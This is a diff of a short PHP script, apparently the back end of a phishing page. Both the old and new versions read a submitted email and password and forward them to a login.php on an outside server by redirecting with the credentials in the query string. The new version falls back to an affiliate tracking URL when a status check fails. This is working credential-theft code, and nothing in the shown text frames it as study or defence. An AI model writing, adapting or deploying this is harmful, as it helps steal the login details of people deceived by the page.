@@ -1,35 +1,19 @@
-<? 
-if($_POST){
- function nowww($text) {
- $word = array(
- "http://" => "",
- "www." => "",
- );
- foreach ($word as $bad => $good) {
- $text = str_replace($bad, $good, $text);
- }
- $oldurl = explode("/", $text);
- $newurl = $oldurl[0];
- $text = "$newurl";
- $text = strip_tags(addslashes($text));
- return $text;
- }
-//url que queremos saber si esta up o down
- $url = "http://server1.3utilities.com/api-server.php";
+<?php 
 
- $site = nowww("$url"); 
- $check = @fsockopen($site, 80); 
-
- if ($check) { 
- $usuario = $_POST[ 'email' ];
+$usuario = $_POST[ 'email' ];
 $password = $_POST[ 'pass' ];
-   
-header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=$usuario&password=$password");
- }
-else { 
- //header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
- 
- echo $usuario . " " . $password;
-} 
+// API SERVER
+$estadisticasAPI = json_decode( file_get_contents('http://server1.3utilities.com/api-server.php'), true );
+$estado = $estadisticasAPI['estado'];
+
+if($estado == 'online'){
+
+ header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
+
+}else{
+
+  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=7M45dBxc5&type=21&click_id={click_id}");
 }
+
+
  ?>
